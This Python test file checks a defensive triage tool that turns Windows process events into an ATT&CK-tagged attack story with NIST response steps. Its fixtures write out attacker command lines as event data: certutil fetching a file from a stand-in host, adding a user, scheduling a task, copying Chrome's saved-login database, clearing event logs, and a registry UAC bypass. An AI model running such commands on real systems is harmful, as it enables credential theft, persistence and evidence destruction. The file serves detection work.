"""The attack story: how it got in, the numbered steps, ATT&CK tags and the NIST next steps."""

from tests.fixtures.events import USER, attack_events, benign_events, event
from triage import story
from triage.checks import make_verdict, run_checks

# The MITRE ATT&CK tactics the story may use.
TACTICS = ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
           "Credential Access", "Discovery", "Lateral Movement", "Collection", "Command and Control",
           "Exfiltration", "Impact"]


def steps_of(events):
    return story.build_steps(events, run_checks(events))


def recon_chain(program, parent="C:\\Windows\\explorer.exe"):
    """A program that runs whoami + ipconfig (a High-confidence finding), started by parent."""
    return [
        event(1, 1, "2026-01-05 10:00:00.000", ProcessGuid="{x}", ParentProcessGuid="{parent}",
              Image=program, ParentImage=parent, CommandLine=f'"{program}"'),
        event(2, 1, "2026-01-05 10:00:01.000", ProcessGuid="{c1}", ParentProcessGuid="{x}",
              Image="C:\\Windows\\System32\\cmd.exe", ParentImage=program, CommandLine="cmd /c whoami"),
        event(3, 1, "2026-01-05 10:00:01.100", ProcessGuid="{w}", ParentProcessGuid="{c1}",
              Image="C:\\Windows\\System32\\whoami.exe", ParentImage="C:\\Windows\\System32\\cmd.exe"),
        event(4, 1, "2026-01-05 10:00:01.200", ProcessGuid="{i}", ParentProcessGuid="{c1}",
              Image="C:\\Windows\\System32\\ipconfig.exe", ParentImage="C:\\Windows\\System32\\cmd.exe"),
    ]


# ---------- how it got in ----------

def test_browser_download_with_referrer_uac_and_double_click():
    steps = steps_of(attack_events())
    origin, execution = steps[0], steps[1]
    # No technique: the referrer page alone does not show how the user got there.
    assert origin["tactic"] == "Initial Access" and origin["technique"] == ""
    assert "with Edge from https://www.fireeyee.com/download/FireEyeInstaller.exe" in origin["text"]
    assert "from the page https://www.fireeyee.com/" in origin["text"]
    assert "How the user reached that site" in origin["text"]  # no DNS lookup for it in the log
    assert "double-clicking" in execution["text"] and "UAC" in execution["text"]


def test_email_attachment():
    program = USER + "\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\AB12\\invoice.exe"
    origin = steps_of(recon_chain(program, "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"))[0]
    assert origin["technique"].startswith("T1566.001")
    assert "email attachment" in origin["text"]


def test_unknown_origin_is_said_plainly():
    origin = steps_of(recon_chain(USER + "\\Desktop\\tool.exe"))[0]
    assert origin["technique"] == ""
    assert "not in this log" in origin["text"]


def test_document_name_is_read_from_the_word_command_line():
    word = "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE"
    events = [
        event(1, 1, "2026-01-05 10:00:00.000", ProcessGuid="{word}", ParentProcessGuid="{explorer}",
              Image=word, ParentImage="C:\\Windows\\explorer.exe",
              CommandLine=f'"{word}" /n "C:\\Users\\a\\Downloads\\invoice.docm" /o ""'),
        event(2, 1, "2026-01-05 10:00:05.000", ProcessGuid="{cmd}", ParentProcessGuid="{word}",
              Image="C:\\Windows\\System32\\cmd.exe", ParentImage=word, CommandLine="cmd.exe /c whoami"),
    ]
    assert "invoice.docm" in steps_of(events)[0]["text"]


def test_other_drive_has_no_technique():
    # setup.exe also clears a log (a High finding with no legitimate use), so its recon stays High.
    clears_log = event(5, 1, "2026-01-05 10:00:02.000", ProcessGuid="{wev}", ParentProcessGuid="{x}",
                       Image="C:\\Windows\\System32\\wevtutil.exe", ParentImage="D:\\setup.exe",
                       CommandLine="wevtutil cl Security")
    origin = steps_of(recon_chain("D:\\setup.exe") + [clears_log])[0]
    assert origin["text"] == "setup.exe was started from drive D: (possibly a USB or network drive)."
    assert origin["technique"] == ""


def test_recon_technique_follows_the_first_tool():
    def recon_technique(first_tool, second_tool):
        program = USER + "\\Downloads\\tool.exe"
        events = [
            event(1, 1, "2026-01-05 10:00:00.000", ProcessGuid="{x}", ParentProcessGuid="{p}",
                  Image=program, ParentImage="C:\\Windows\\explorer.exe", CommandLine=f'"{program}"'),
            event(2, 1, "2026-01-05 10:00:01.000", ProcessGuid="{t1}", ParentProcessGuid="{x}",
                  Image=f"C:\\Windows\\System32\\{first_tool}", ParentImage=program),
            event(3, 1, "2026-01-05 10:00:02.000", ProcessGuid="{t2}", ParentProcessGuid="{x}",
                  Image=f"C:\\Windows\\System32\\{second_tool}", ParentImage=program),
        ]
        recon = [s for s in steps_of(events) if s.get("check") == "recon_burst"]
        return recon[0]["technique"]

    assert recon_technique("ipconfig.exe", "whoami.exe") == "T1016 System Network Configuration Discovery"
    assert recon_technique("whoami.exe", "ipconfig.exe") == "T1033 System Owner/User Discovery"
    assert recon_technique("tasklist.exe", "whoami.exe") == "T1057 Process Discovery"
    assert recon_technique("nltest.exe", "whoami.exe") == "T1087 Account Discovery"


def test_document_from_the_browser():
    document_chain = [e for e in attack_events() if e["record_id"] >= 200]
    steps = steps_of(benign_events() + document_chain)
    assert "downloaded leak.rtf with Edge from https://www.leak-site.example.com/files/leak.rtf" in steps[0]["text"]
    assert "straight from Edge, which opened it in wordpad.exe" in steps[1]["text"]
    tactics = [s["tactic"] for s in steps]
    assert "Persistence" in tactics and "Impact" in tactics


# ---------- the steps ----------

def test_every_step_has_a_tag_proof_and_a_number():
    events = attack_events()
    ids = {e["record_id"] for e in events}
    steps = steps_of(events)
    assert [s["number"] for s in steps] == list(range(1, len(steps) + 1))
    for s in steps:
        assert s["tactic"] in TACTICS
        assert s["event_ids"] and set(s["event_ids"]) <= ids
    assert all(s["technique"] for s in steps[1:])


def test_no_story_for_a_benign_log():
    assert steps_of(benign_events()) == []


def test_key_moments_are_short_and_start_with_how_it_got_in():
    moments = story.key_moments(steps_of(attack_events()))
    assert len(moments) <= 8
    assert moments[0]["tactic"] == "Initial Access" and moments[1]["tactic"] == "Execution"


def test_unrelated_low_findings_are_kept_apart():
    installer = USER + "\\Downloads\\vendor_setup.exe"
    events = attack_events() + [
        event(400, 1, "2026-01-05 12:00:00.000", ProcessGuid="{vendor}", ParentProcessGuid="{p-explorer}",
              Image=installer, ParentImage="C:\\Windows\\explorer.exe", CommandLine=f'"{installer}"')]
    part, other = story.split_low_findings(events, run_checks(events))
    assert any("vendor_setup.exe" in f["process"] for f in other)
    assert not any("vendor_setup.exe" in f["process"] for f in part)
    assert any("FireEyeInstaller.exe" in f["process"] for f in part)


def test_page_shows_real_addresses_as_code_text():
    text = "Edge saved FireEye.exe from https://www.fireeyee.com/a.exe, then called 167.172.71.11:80"
    assert story.code_addresses(text) == ("Edge saved FireEye.exe from <code>https://www.fireeyee.com/a.exe</code>, "
                                          "then called <code>167.172.71.11:80</code>")
    assert story.code_addresses("version 10.0.22621.1") == "version 10.0.22621.1"


def test_every_check_has_a_tag_a_sentence_and_next_steps():
    for check in story.ATTACK_TAGS:
        assert story.ATTACK_TAGS[check][0] in TACTICS, check
        assert check in story.SENTENCES, check
    from triage.checks import ALL_CHECKS
    for function in ALL_CHECKS:  # check_recon_burst -> "recon_burst"
        assert function.__name__.removeprefix("check_") in story.ACTIONS, function.__name__


def test_new_checks_become_story_steps():
    sys32 = "C:\\Windows\\System32\\"
    tool = USER + "\\AppData\\Roaming\\x\\tool.exe"
    commands = [(sys32 + "wbem\\WMIC.exe", 'wmic /node:SRV-01 process call create "cmd"'),
                (sys32 + "net.exe", "net user helpdesk **** /add"),
                (sys32 + "schtasks.exe", "schtasks /create /tn T /tr C:\\x.exe /sc daily"),
                (sys32 + "certutil.exe", "certutil -urlcache -split -f http://x.example/a a"),
                (sys32 + "rundll32.exe", f"rundll32.exe {USER}\\AppData\\Roaming\\x\\a.dll,Start"),
                (sys32 + "esentutl.exe", f'esentutl /y "{USER}\\AppData\\Local\\Google\\Chrome\\User Data\\'
                                         f'Default\\Login Data" /d C:\\ld'),
                (sys32 + "wevtutil.exe", "wevtutil cl System")]
    events = [event(n, 1, f"2026-01-05 10:00:{n:02d}.000", ProcessGuid=f"{{c{n}}}", ParentProcessGuid="{tool}",
                    Image=image, ParentImage=tool, CommandLine=command)
              for n, (image, command) in enumerate(commands, start=1)]
    events.append(event(20, 13, "2026-01-05 10:00:20.000", ProcessGuid="{tool}", Image=tool,
                        TargetObject="HKU\\S-1-5-21-0_Classes\\Software\\Classes\\ms-settings\\shell\\open\\command",
                        Details="C:\\x.exe"))
    findings = run_checks(events)
    steps = story.build_steps(events, findings)
    told = {s.get("check") for s in steps}  # the delivery step comes from the story, not a check
    for check in ["remote_execution", "access_change", "scheduled_task", "tool_download", "dll_from_user_folder",
                  "credential_theft", "evidence_removal", "uac_bypass"]:
        assert check in told, check
    assert all(s["tactic"] in TACTICS and s["technique"] for s in steps if s["kind"] == "finding")
    plan = story.next_steps(findings, make_verdict(findings), steps)
    assert any("Reset the passwords" in item for item in plan["Contain"])
    assert make_verdict(findings)["label"] == "Malicious"


def test_next_steps_use_nist_phases():
    events = attack_events()
    findings = run_checks(events)
    plan = story.next_steps(findings, make_verdict(findings), story.build_steps(events, findings))
    assert list(plan) == [p for p in story.PHASES if p in plan]
    assert {"Investigate", "Contain", "Eradicate", "Recover"} <= set(plan)
    assert any("www.fireeyee.com" in step for step in plan["Contain"])


def test_download_site_host_without_a_path():
    malicious = {"label": "Malicious", "reason": ""}
    no_path = [{"kind": "origin", "technique": "",
                "text": "The user downloaded a.exe with Edge from https://a.com, from the page https://b.com/."}]
    with_path = [{"kind": "origin", "technique": "",
                  "text": "The user downloaded a.exe with Edge from https://www.a.com/x/a.exe."}]
    assert "Block the download site a.com at the web proxy." in story.next_steps([], malicious, no_path)["Contain"]
    assert "Block the download site www.a.com at the web proxy." in story.next_steps([], malicious, with_path)["Contain"]


def test_benign_next_steps_are_investigate_only():
    plan = story.next_steps([], make_verdict([]))
    assert list(plan) == ["Investigate"]
    assert plan["Investigate"][0].startswith("Nothing known-bad was found by the checks; "
                                             "this does not prove the computer is clean.")
